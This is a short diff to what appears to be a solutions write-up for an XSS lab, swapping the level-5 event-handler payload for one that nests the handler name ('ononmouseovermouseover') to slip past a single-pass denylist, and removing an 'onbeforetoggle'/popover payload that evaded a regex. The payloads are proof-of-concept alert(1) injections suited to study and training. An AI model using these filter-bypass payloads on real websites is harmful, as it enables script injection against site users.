@@ -32,7 +32,7 @@ Reflection injected directly into a `<div>` tag's attribute area (`<div QUERY>`)
 
 ### eventhandler-xss-level5
 
-`/eventhandler/level5/?query=onbeforetoggle=alert(1)%20popover=auto%20id=x%20tabindex=0%20autofocus`
+`/eventhandler/level5/?query=x%20ononmouseovermouseover=alert(1)%20x`
 
-- payload: `onbeforetoggle=alert(1) popover=auto id=x tabindex=0 autofocus`
-- context: massive handler denylist but `onbeforetoggle` not in level-5 regex
+- payload: `x ononmouseovermouseover=alert(1) x`
+- context: single-pass handler denylist; nest the name so it rejoins
